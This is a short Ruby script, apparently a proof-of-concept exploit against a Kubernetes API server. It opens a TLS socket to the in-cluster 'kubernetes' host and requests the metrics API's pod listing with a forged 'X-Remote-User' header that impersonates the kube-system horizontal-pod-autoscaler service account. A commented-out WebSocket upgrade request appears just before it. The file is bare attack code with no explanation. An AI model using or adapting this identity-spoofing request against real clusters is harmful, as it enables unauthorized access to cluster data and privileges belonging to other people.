#!/usr/bin/env ruby

require 'socket'
require 'openssl'
require 'json'

host = 'kubernetes'
metrics = '/apis/metrics.k8s.io/v1beta1'


sock = TCPSocket.new host, 443
ssl = OpenSSL::SSL::SSLSocket.new sock
ssl.sync_close = true
ssl.connect

#ssl.puts "GET #{metrics} HTTP/1.1\r\nHost: #{host}\r\nUpgrade: WebSocket\r\nConnection: upgrade\r\n\r\n"
#6.times { puts ssl.gets }
ssl.puts "GET #{metrics}/pods HTTP/1.1\r\nHost: #{host}\r\nX-Remote-User: system:serviceaccount:kube-system:horizontal-pod-autoscaler\r\n\r\n"
6.times { puts ssl.gets }

puts ssl.gets

puts JSON.pretty_generate JSON.parse ssl.gets

ssl.close
